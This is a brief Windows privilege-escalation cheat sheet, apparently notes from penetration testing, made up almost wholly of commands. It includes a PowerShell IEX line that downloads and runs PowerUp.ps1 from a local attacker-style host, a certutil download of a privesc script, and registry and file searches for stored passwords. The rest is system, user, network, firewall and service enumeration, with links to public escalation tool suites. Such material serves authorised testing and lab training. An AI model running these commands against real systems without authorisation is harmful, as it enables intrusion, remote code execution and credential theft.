#### Steps ####

```whoami```

```whoami /priv```

```powershell "IEX(New-Object Net.WebClient).DownloadString('http://192.168.x.x:8000/PowerUp.ps1')"```

```certutil.exe -urlcache -split -f http://192.168.x.x:8000/privesc.bat privesc.bat```

```WinPeas```

> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

#### CMD Commands ####

```net config Workstation```

```systeminfo | findstr /B /C:"OS Name" /C:"OS Version"```

```hostname```

```net users```

```ipconfig /all```

```route print```

```arp -A```

```netstat -ano```

```netsh firewall show state```	

```netsh firewall show config```

```schtasks /query /fo LIST /v```

```tasklist /SVC```

```net start```

```DRIVERQUERY```

```reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated```

```reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated```

```dir /s *pass* == *cred* == *vnc* == *.config* ```

```findstr /si password *.xml *.ini *.txt```

```reg query HKLM /f password /t REG_SZ /s```

```reg query HKCU /f password /t REG_SZ /s```

```sc qc Spooler```

```accesschk.exe -ucqv Spooler```

> https://github.com/frizb/Windows-Privilege-Escalation/blob/master/windows_recon.bat
